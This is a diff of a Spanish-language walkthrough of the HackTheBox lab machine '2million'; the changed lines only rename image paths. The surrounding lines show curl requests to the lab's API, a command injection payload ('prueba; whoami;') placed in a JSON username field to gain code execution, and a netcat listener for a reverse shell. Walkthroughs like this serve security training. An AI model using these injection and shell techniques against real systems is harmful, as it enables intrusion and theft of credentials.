@@ -88,7 +88,7 @@ Ponemos el código de invitación.
 
 Nos logueamos con las credenciales registradas.
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos al apartado de **Access**. Miramos los endpoints de la API.
 
@@ -96,7 +96,7 @@ Vamos al apartado de **Access**. Miramos los endpoints de la API.
 curl -s -X GET "http://2million.htb/api/v1" -v
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos sale **Unauthorized** por lo que tenemos que coger la **cookie session**.
 
@@ -138,7 +138,7 @@ Somos administradores lo que significa que la API está mal configurada. Por si 
 curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" | jq
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Intentamos generar una VPN ya que somos admin.
 
@@ -146,7 +146,7 @@ Intentamos generar una VPN ya que somos admin.
 curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" | jq
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Matizamos lo que se nos avisa.
 
@@ -166,7 +166,7 @@ curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPS
 
 La respuesta ya no está en JSON por lo que lo quitamos.
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🚀 **EXPLOTACIÓN**
 
@@ -176,7 +176,7 @@ Genera una VPN por el usuario que le diga. Por lo que hacemos lo siguiente.
 curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=ekuhv9pthbgidsinr34h04n0hq" -H "Content-Type: application/json" -d '{"username":"prueba; whoami;"}'
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Somos www-data por lo que tenemos RCE.
 
@@ -190,11 +190,11 @@ Nos conectamos.
 nc -lnvp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos un fichero .env interesante mostramos su contenido.
 
-<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Migramos de usuario.
 
